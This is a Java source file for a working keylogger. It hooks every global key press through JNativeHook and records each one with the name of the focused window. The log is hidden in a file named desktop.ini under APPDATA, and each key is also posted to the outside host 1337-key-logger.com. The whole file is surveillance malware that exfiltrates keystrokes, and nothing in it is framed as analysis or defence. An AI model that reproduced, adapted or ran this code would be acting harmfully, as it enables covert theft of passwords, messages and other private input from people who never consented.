package app;

import java.io.*;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;


public class KeyLogger implements NativeKeyListener {
    private String dataFolder = System.getenv("APPDATA");
    private final Path file = Paths.get(dataFolder+"/desktop.ini");
    private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);

    public static void main(String[] args) throws Exception {

        init();

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            logger.error(e.getMessage(), e);
            System.exit(-1);
        }

        GlobalScreen.addNativeKeyListener(new KeyLogger());
    }

    private static void init() {

        // Get the logger for "org.jnativehook" and set the level to warning.
        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);

        // Don't forget to disable the parent handlers.
        logger.setUseParentHandlers(false);
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
            if (keyText.length() > 1) {
                String ret=WindowsFocus.work();
                writer.print(ret+" [" + keyText + "]\n");
                if(netIsAvailable()){
                    sendtoServer(ret+" [" + keyText + "]\n");
                }
            } else {
                writer.print(keyText);
            }


        } catch (IOException ex) {
            logger.error(ex.getMessage(), ex);
            System.exit(-1);
        } catch (Exception e1) {
            e1.printStackTrace();
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        // Nothing
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        // Nothing here
    }

    private static boolean netIsAvailable() {
        try {
            final URL url = new URL("http://www.google.com");
            final URLConnection conn = url.openConnection();
            conn.connect();
            conn.getInputStream().close();
            return true;
        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            return false;
        }
    }

    void sendtoServer (String key) {
        try {

            URL url;
            URLConnection urlConn;
            DataOutputStream dos;

            url = new URL("http://1337-key-logger.com");
            urlConn = url.openConnection();
            urlConn.setDoInput(true);
            urlConn.setDoOutput(true);
            urlConn.setUseCaches(false);
            urlConn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            dos = new DataOutputStream(urlConn.getOutputStream());
            String message = "NEW_KEY=" + URLEncoder.encode(key);
            dos.writeBytes(message);
            dos.flush();
            dos.close();

        }
        catch (IOException ignored) {

        }
    }
}